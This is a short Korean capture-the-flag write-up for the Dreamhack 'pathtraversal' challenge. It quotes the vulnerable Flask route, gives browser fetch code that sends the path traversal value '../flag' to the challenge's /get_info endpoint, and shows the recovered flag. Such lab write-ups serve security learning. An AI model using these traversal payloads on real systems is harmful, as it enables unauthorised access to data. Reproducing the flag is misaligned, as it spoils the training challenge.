## pathtraversal
> 문제 URL: https://dreamhack.io/wargame/challenges/12  
> 사용자의 정보를 조회하는 API 서버입니다. Path Traversal 취약점을 이용해 /api/flag에 있는 플래그를 획득하세요!


### Solve
1. 화면에서 `../flag` 입력 시 `users` 딕셔너리 키 검색을 통해 확인하므로, `{}` 리턴함
```py
@app.route('/api/user/<uid>')
@internal_api
def get_flag(uid):
    try:
        info = users[uid]  # 여기서 uid는 'userid'로 전달되는 값입니다.
    except:
        info = {}
    return json.dumps(info)
```

2. Chrome 개발자모드를 이용해서, js fetch를 이용해 요청 전송
```js
let userid = '../flag';

// POST 요청 보내기
fetch('/get_info', {
    method: 'POST', // 요청 방식 (POST)
    headers: {
        'Content-Type': 'application/x-www-form-urlencoded', // 요청 헤더 설정
    },
    body: new URLSearchParams({
        'userid': userid // 폼 데이터로 userid 전송
    })
})
.then(response => response.text())  // 서버의 응답을 텍스트로 처리
.then(data => {
    // 서버에서 받은 응답 처리 (예: 화면에 표시)
    console.log(data);
})
.catch(error => {
    // 에러 처리
    console.error('Error:', error);
});
```

3. 응답에서 flag 확인가능
```html
<h1>Get User Info</h1><br/>
  <pre>DH{8a33bb6fe0a37522bdc8adb65116b2d4}
</pre>
```